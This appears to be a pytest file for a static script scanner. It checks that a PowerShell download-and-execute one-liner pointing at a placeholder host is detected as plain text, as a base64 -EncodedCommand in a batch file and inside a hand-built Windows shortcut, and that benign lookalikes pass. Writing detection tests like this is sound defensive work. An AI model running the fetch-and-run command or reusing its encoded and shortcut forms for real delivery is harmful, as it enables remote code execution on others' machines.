from base64 import b64encode
import struct
import zipfile

from sentinel.bc_scan import scan_folder
from sentinel.bc_script_analysis import inspect_script


# Documentation-only domain. These bytes are never executed.
FLOW = "$body = Invoke-RestMethod 'https://example.invalid/payload'; Invoke-Expression $body"


def test_lexical_flow_and_benign_neighbors():
    assert inspect_script(FLOW.encode("utf-16"), ".ps1")
    assert not inspect_script(b"# IEX (IRM https://example.invalid)\nWrite-Output 'IEX (IRM https://example.invalid)'", ".ps1")
    assert not inspect_script(b"IRM https://example.invalid; Write-Output IEX", ".ps1")
    assert not inspect_script(FLOW.replace("; Invoke-Expression", "; $body = 'local'; Invoke-Expression").encode(), ".ps1")


def test_encoded_batch_and_unicode_link():
    encoded = b64encode(FLOW.encode("utf-16-le"))
    args = b"-EncodedCommand " + encoded
    assert inspect_script(b"@powershell.exe " + args, ".cmd")
    harmless = b64encode("Write-Output 'hello'".encode("utf-16-le"))
    assert not inspect_script(b"powershell.exe -e " + harmless, ".cmd")
    header = bytes.fromhex("4c0000000114020000000000c000000000000046")
    link = header + struct.pack("<I", 0xa0) + bytes(52)
    link += struct.pack("<H", len(args)) + args.decode("ascii").encode("utf-16-le")
    assert inspect_script(link, ".lnk")


def test_scan_reports_zip_script_advisory_and_malformed_link(tmp_path):
    with zipfile.ZipFile(tmp_path / "test.zip", "w") as archive:
        archive.writestr("document.ps1", FLOW)
    (tmp_path / "broken.lnk").write_bytes(b"incomplete")
    result = scan_folder(tmp_path)
    assert result["files"] == 2 and result["skipped"] == 1
    assert result["findings"][0]["source"] == "euristica statica BC"
    assert "isolate_path" not in result["findings"][0]
